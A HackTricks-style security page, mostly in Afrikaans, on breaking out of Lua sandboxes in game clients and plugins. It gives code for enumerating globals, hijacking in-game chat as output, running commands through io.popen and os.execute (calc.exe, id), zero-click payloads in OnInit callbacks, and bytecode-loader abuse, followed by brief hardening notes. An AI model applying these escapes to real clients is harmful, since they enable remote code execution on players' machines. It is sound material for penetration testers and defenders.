# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Hierdie bladsy versamel praktiese tegnieke om Lua "sandboxes" wat in toepassings ingebed is (veral game clients, plugins, of in-app scripting engines) te enumereer en daaruit te breek. Baie engines stel 'n beperkte Lua-omgewing beskikbaar, maar laat kragtige globals bereikbaar wat arbitêre opdraguitvoering of selfs native memory corruption moontlik maak wanneer bytecode loaders blootgestel word.

Key ideas:
- Behandel die VM as 'n onbekende omgewing: enumereer _G en ontdek watter gevaarlike primitives bereikbaar is.
- Wanneer stdout/print geblokkeer is, misbruik enige in-VM UI/IPC channel as 'n output sink om resultate te observeer.
- As io/os blootgestel is, het jy dikwels direkte command execution (io.popen, os.execute).
- As load/loadstring/loadfile beskikbaar is, kan die uitvoering van gespesialiseerde Lua bytecode geheueveiligheid in sommige weergawes ondermyn (≤5.1 verifiers are bypassable; 5.2 removed verifier), wat geavanceerde exploitation moontlik maak.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- As daar geen print() beskikbaar is nie, hergebruik in-VM channels. Voorbeeld uit 'n MMO housing script VM waar chat output slegs werk na 'n sound call; die volgende bou 'n betroubare output-funksie:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliseer hierdie patroon vir jou teiken: enige textbox, toast, logger, of UI callback wat strings aanvaar, kan as stdout vir verkenning dien.

## Direkte command execution as io/os blootgestel is

As die sandbox steeds die standaardbiblioteke io of os blootstel, het jy waarskynlik onmiddellike command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- Uitvoering gebeur binne die kliëntproses; baie anti-cheat/antidebug-lae wat eksterne debuggers blokkeer, sal in-VM prosescreatie nie voorkom nie.
- Kontroleer ook: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

As die host-applikasie skripte na kliënte druk en die VM auto-run hooks blootstel (bv. OnInit/OnLoad/OnEnter), plaas jou payload daar vir drive-by compromise sodra die skrip laai:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Enige ekwivalente callback (OnLoad, OnEnter, etc.) generaliseer hierdie tegniek wanneer scripts outomaties na die kliënt gestuur en daar uitgevoer word.

## Gevaarlike primitiewe om tydens recon na te soek

Tydens _G-enumerasie, kyk spesifiek na:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: voer bron of bytecode uit; ondersteun die laai van onbetroubare bytecode.
- package, package.loadlib, require: dinamiese biblioteeklading en module-oppervlak.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opsionele eskalasie: misbruik van Lua bytecode-laaiers

Wanneer load/loadstring/loadfile bereikbaar is maar io/os beperk is, kan die uitvoering van voorafgemaakte Lua bytecode lei tot geheue-openbaring en korrupsie-primitiewe. Belangrike feite:
- Lua ≤ 5.1 het 'n bytecode verifier wat bekende bypasses het.
- Lua 5.2 het die verifier heeltemal verwyder (amptelike standpunt: toepassings moet bloot precompiled chunks verwerp), wat die aanvaloppervlak vergroot as bytecode loading nie verbied word nie.
- Tipiese werkvloei: leak pointers via in-VM output, craft bytecode om type confusions te skep (bv. rondom FORLOOP of ander opcodes), en dan pivot na arbitrary read/write of native code execution.

Hierdie pad is engine-/version-spesifiek en vereis RE. Sien die verwysings vir diepgaande ontledings, exploitation primitives, en voorbeeld-gadgetry in games.

## Opsporing- en verhardingsnotas (vir verdedigers)

- Bedienerkant: verwerp of herskryf gebruikersskripte; allowlist veilige APIs; verwyder of bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Kliëntkant: voer Lua uit met 'n minimale _ENV, verbied bytecode loading, herintroduceer 'n streng bytecode verifier of signature checks, en blokkeer process creation vanaf die kliëntproses.
- Telemetrie: waarsku op gameclient → child process creation kort ná skriplaai; korreleer met UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
